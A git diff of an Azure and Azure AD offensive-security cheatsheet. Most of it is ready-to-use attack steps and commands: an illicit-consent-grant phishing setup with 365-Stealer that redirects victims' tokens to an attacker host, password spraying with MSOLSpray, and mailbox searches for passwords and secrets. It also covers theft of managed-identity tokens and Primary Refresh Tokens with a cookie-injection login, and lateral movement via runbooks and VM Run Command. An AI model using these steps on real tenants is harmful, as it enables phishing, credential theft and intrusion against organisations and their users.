@@ -30,6 +30,9 @@ The also called Azure Functions provides the possibility to run code serverless.
 ## Managed Identity
 A Managed Identity is a Service Principal of a special type that may only be used with Azure resources. Managed Identities can be used to access Azure Key Vaults and storage accounts.
 
+### Hybrid Joined machine
+Device joined to an on-prem AD and Azure AD.
+
 ## Resource
 A Resource can be an account, run-book, virtual network, application, etc.
 
@@ -94,8 +97,11 @@ Management-Groups
 
 # Azure AD Connect Methods
 
+For each Azure AD Connect method the account MSOL_<installId> is created at on-prem AD.
+This user can reset the password of any user and DCsync permission on AD
+
 ## Password Hash Synchronization
-Using the Password Hash Synchronization (PHS) the passwords from on-premise AD are sent to the cloud. This is done using a specific service account that has similar rights like DCSync.
+Using the Password Hash Synchronization (PHS) the passwords from on-premise AD are sent to the cloud. This is using a specific service account (MSOL_<installId>) that has similar rights like DCSync. Authentication takes place on Azure AD. Password expiry in on-prem domain does not reflect to Azure AD. Additionally the user Sync_<id> is created. This uswr can reset the password of every synced user.
 
 ## Pass Through Authentication
 Using the Pass Through Authentication (PTA) the passwords are kept on-premise and an on-premise agent validates the authentication.
@@ -106,7 +112,7 @@ Using the Active Directory Federation Services (ADFS) Azure AD is set as a trust
 ## Azure AD Directory
 Each tenant has a dedicated Directory, which is used to perform identity and access managment functions.
 
-# OpenID Connect token types
+# Token types
 
 ## Access Tokens
 Used in combination of user, client, and resource. Cannot be revoked until expiry (1 hour default).
@@ -114,8 +120,12 @@ Used in combination of user, client, and resource. Cannot be revoked until expir
 ## ID Tokens
 Used in combination of user and client. Contains information about the user.
 
-## Refresh Tokens
+## Refresh Token
 Used in combination of user and client. Used to get new access and ID tokens. Cannot be revoked until expiry (default 90 days of inactivity).
+
+## Primary Refresh Token
+Used for single sign and to obtain and refresh tokens to any application. Valid for 90 days and continuously renewed. Can be extracted from AzureAD joined or Hybrid joined machines.
+
 
 # Microsoft MFA verification options
 ```
@@ -143,6 +153,8 @@ IDENTITY_ENDPOINT
 
 ### Get access token
 ```
+https://github.com/r1cksec/cheatsheets/blob/main/snippets/py/getAzureIdentity.py
+
 curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
 ```
 
@@ -182,10 +194,33 @@ https://<storageAccount>.dfs.core.windows.net
 https://<storageAccount>.file.core.windows.net
 https://<storageAccount>.queue.core.windows.net
 https://<storageAccount>.table.core.windows.net
+
+Get content of blob:
+<storageAccount>.blob.core.windows.net/<storageName>/<blob>
+<storageAccount>.blob.core.windows.net/<storageName>?restype=container&comp=list/<blob>
+
+Invoke-EnumerateAzureBlobs -Base <tenant> defcorp
 ```
 
+## Phishing (Illicit Consent Grant)
 ```
-Invoke-EnumerateAzureBlobs -Base <tenant> defcorp
+https://github.com/AlteredSecurity/365-Stealer
+https://github.com/r1cksec/cheatsheets/blob/main/windows/azure-arm-api.md
+
+Get Access Token by creating an application in the attacker tenant and send the Authorization Link to a victim.
+
+https://portal.azure.com > Azure Active Directory > App Registrations > New registration > Choose Name
+Supported Account Types: Check - 'Accounts in any organizational directory (Any Azure AD directory - Multitenant)
+Choos Web from Dropdown: Web
+Redirect Uri: https://attacker365-StealerRhost/login/authorized
+Register > Certificates & Secrets > New Client Secret > Add > Api Permissions > Add a permission > Microsoft Graph > Delegated permissions
+Search: user.read
+Check: user.read and User.ReadBasic.All > Add permissions
+Overview > note Application (Client) ID
+
+python 365-Stealer.py --run-app
+
+Use access token with graph.microsoft.com/v1.0/users list users in target tenant
 ```
 
 ## Authenticated user enumeration and Password Spraying
@@ -196,20 +231,6 @@ Invoke-EnumerateAzureBlobs -Base <tenant> defcorp
 Invoke-MSOLSpray -UserList .\<userlist>.txt -Password <password>
 ```
 
-## Tools for authenticated recon
-* https://github.com/dirkjanm/ROADtools
-* https://github.com/Gerenios/AADInternals
-* https://github.com/nyxgeek/o365recon
-* https://www.powershellgallery.com/packages/AzureAD/2.0.2.140
-
-## Search mailboxes and extract contact informations
-* https://github.com/dafthack/MailSniper
-```
-Invoke-SelfSearch -Mailbox <user>@<domain> -Terms "*password*","*secret*","*key*"
-
-Get-GlobalAddressList -ExchHostname <rhost> -UserName <domain>\<user> -Password <password> -OutFile <outFile>
-```
-
 ## Identify inconsistencies in Microsoft MFA deployments
 * https://github.com/dafthack/MFASweep
 
@@ -217,16 +238,144 @@ Get-GlobalAddressList -ExchHostname <rhost> -UserName <domain>\<user> -Password 
 Invoke-MFWSweep -Username <user>@<domain> -Password <password>
 ```
 
-## Vulnerability Analyse
-* https://github.com/hausec/PowerZure
-* https://github.com/Azure/Stormspotter
+## Authenticated recon
+* https://github.com/dirkjanm/ROADtools
+* https://github.com/Gerenios/AADInternals
+* https://github.com/nyxgeek/o365recon
+* https://www.powershellgallery.com/packages/AzureAD/2.0.2.140 (Get-AzureAD)
 * https://github.com/BloodHoundAD/AzureHound
+* https://github.com/r1cksec/cheatsheets/blob/main/windows/az-powershell.md
 
-## Resources
-* https://csandker.io/2022/10/19/Untangling-Azure-Permissions.html
-* https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques
-* https://m365internals.com/2021/11/30/lateral-movement-with-managed-identities-of-azure-virtual-machines
-* https://pentestbook.six2dez.com/enumeration/cloud/azure
-* https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a
-* https://www.youtube.com/watch?v=u_3cV0pzptY
+```
+roadrecon auth -u <user>@<tenant>.onmicrosoft.com -p <password>
+roadrecon gather
+
+./o365recon.ps1 -azure
+
+Get-AADIntTenantDomains -Domain
+Invoke-AADIntReconAsOutsider -DomainName <tenant>.onmicrosoft.com
+
+Get-AzureADTenantDetail
+Get-AzureADUser -All $true | ConvertTo-Json
+
+Invoke-Azurehound
+
+Get-AzResource
+Get-AzRoleAssignment
+```
+
+## Search mailboxes and extract contact informations
+* https://github.com/dafthack/MailSniper
+
+```
+Invoke-SelfSearch -Mailbox <user>@<domain> -Terms "*password*","*secret*","*key*"
+
+Get-GlobalAddressList -ExchHostname <rhost> -UserName <domain>\<user> -Password <password> -OutFile <outFile>
+```
+
+## Authenticated Storage Accounts
+* https://github.com/r1cksec/cheatsheets/blob/main/windows/az-powershell.md
+* https://azure.microsoft.com/en-us/products/storage/storage-explorer
+
+```
+Get-AzStorageAccount
+```
+
+## Authenticated Key Vaults
+* https://github.com/r1cksec/cheatsheets/blob/main/windows/az-powershell.md
+* https://github.com/r1cksec/cheatsheets/blob/main/windows/az.md
+
+```
+Roles that can read content: 
+Key Vault Administrator
+Key Vault Certificates Officer
+Key Vault Crypto Officer
+Key Vault Secrets User
+
+Get-AzKeyVault
+
+az keyvault list
+```
+
+## Authenticated - ARM templates
+* https://learn.microsoft.com/en-us/azure/azure-resource-manager/templates/overview
+
+```
+JSON file containing deployment configuration for Azure resources.
+Each resource group maintains a deployment history.
+Any user with permission Microsoft.Resources/deployment/read and Microsoft.Resources/subscriptions/resourceGroups/read can read the deployment history.
+
+https://portal.azure.com > Resource Group > choose resource > Settings: Deployments 
+```
+
+## Authenticated - Dynamic Rule Memberships
+* https://learn.microsoft.com/en-us/azure/active-directory/enterprise-users/groups-dynamic-membership
+
+```
+Check if you can join group by dynamic event:
+https://portal.azure.com > Groups > Role > Dynamic membership rules
+```
+
+## Authenticated - User Data
+* https://learn.microsoft.com/en-us/azure/virtual-machines/user-data
+* https://github.com/r1cksec/cheatsheets/blob/main/windows/azure-arm-api.md
+
+```
+$userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://<vm>/metadata/instance/compute/userData?api-version=2021-01-01&format=text"
+[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
+```
+
+## Authenticated - Application Proxy
+* https://learn.microsoft.com/en-us/azure/active-directory/app-proxy/what-is-application-proxy
+
+```
+portal.azure.com > Azure Active Directory > Enteprise applications > Application proxy
+portal.azure.com > Azure Active Directory > Enteprise applications > All applications > Add filters > Is App Proxy
+```
+
+## Pass the Primary Token
+* https://github.com/r1cksec/cheatsheets/blob/main/windows/azure-arm-api.md
+* https://github.com/dirkjanm/ROADtools
+* https://github.com/Gerenios/AADInternals
+
+```
+Get nonce for request validation using ARM API.:
+
+ROADToken.exe <nonce>
+Get-AADIntUserPRTToken
+
+Login using adding Token via Chrome Developer Tab:
+Application > Cookies > login.microsoftonline... > Name: x-ms-RefreshTokenCredential > Value: <PrimaryRefreshToken> > HttpOnly: Check
+```
+
+## Lateral Movement - PowerShell Runbook
+* https://github.com/r1cksec/cheatsheets/blob/main/windows/az.md
+* https://github.com/r1cksec/cheatsheets/blob/main/windows/az-powershell.md
+
+```
+az automation account list
+
+Import-AzAutomationRunbook -Name <runName> -Path <local\path\to\ps1> -AutomationAccountName <name> -ResourceGroupName <name> -Type PowerShell -Force -Verbose
+Publish-AzAutomationRunbook -RunbookName <runName> -AutomationAccountName <name> -ResourceGroupName <name> -Verbose
+Start-AzAutomationRunbook -RunbookName <name> -RunOn <workGroup> -AutomationAccountName <name> -ResourceGroupName <name>
+```
+
+## Lateral Movement - Run Command
+* https://github.com/r1cksec/cheatsheets/blob/main/windows/az-powershell.md
+
+```
+Invoke-AzVmRunCommand -VmName <name> -ResourceGroupName <name> -CommandId "<name>" -ScriptPath "<path>"
+```
+
+## Lateral Movement - Continuous Deployment
+* https://learn.microsoft.com/en-us/azure/app-service/scripts/cli-continuous-deployment-github
+
+```
+Function app supports continuous deployment -> triggered when source code update is pushed
+
+Supportet locations:
+Azure Repos
+Github
+Bitbucket
+```
 
